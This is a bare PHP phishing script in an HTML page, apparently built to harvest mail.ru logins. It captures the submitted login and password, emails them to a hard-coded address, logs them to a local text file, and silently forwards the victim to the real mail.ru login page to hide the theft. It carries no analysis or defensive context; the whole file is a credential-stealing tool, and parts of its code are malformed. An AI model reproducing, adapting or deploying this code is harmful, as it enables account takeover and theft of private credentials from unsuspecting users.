<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
 <title></title>
 <meta http-equiv="Content-Type" content="text/html">
 <meta name="KeyWords" content="">
 <meta name="Description" content="">
 <meta name="Author" content="">
 <meta name="Generator" content="MetaProducts Visual Workshop 4.2">
</head>
<body>
<?
$adminmail = "mymail@mail.ru";

function email($to,$mailtext)
{
mail($to,'password',$mailtext,$adminmail);
}

$text="[".date("d.m.y H:i")."]Login: $_POST[login] Password: $_POST[pass]rn";
email($adminmail,$text);

$file = fopen("bbd_mailru.txt","a");
fputs($file, $text);
fclose($file);

echo "<FORM id='auth' action='http://talk.mail.ru/login.html' method=post>

?>
<INPUT type=hidden name=login value='$_POST[login]'>
<INPUT type=hidden name=pass value='$_POST[pass]'>
<script>auth.submit();</script>
</FORM>
</body>
</html>
